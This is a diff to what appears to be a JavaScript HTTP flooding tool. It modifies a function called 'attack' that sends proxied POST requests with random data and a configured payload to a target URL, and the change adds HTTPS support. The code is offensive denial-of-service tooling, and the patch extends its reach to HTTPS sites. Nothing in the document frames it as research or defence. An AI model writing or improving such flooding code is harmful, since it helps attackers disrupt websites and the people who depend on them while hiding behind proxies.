@@ -135,6 +135,10 @@ function generateRandomString(length) {
 // Function to perform the HTTP request
 function attack(targetUrl, proxy) {
   const parsedUrl = url.parse(targetUrl);
+
+  // Determine whether to use HTTP or HTTPS based on the target URL
+  const protocol = parsedUrl.protocol === 'https:' ? https : http;
+
   const options = {
     host: proxy.ip,
     port: proxy.port,
@@ -156,7 +160,7 @@ function attack(targetUrl, proxy) {
     const postData = `data=${randomString}&payload=${config.payload}`;
     options.headers['Content-Length'] = Buffer.byteLength(postData);
 
-  const req = http.request(options, (res) => {
+  const req = protocol.request(options, (res) => { // Use the determined protocol
     log(`[${config.colorScheme.darkGreen}] Response: ${res.statusCode} from ${proxy.ip}:${proxy.port}`);
     res.on('data', () => {}); // Consume response data
     res.on('end', () => {});
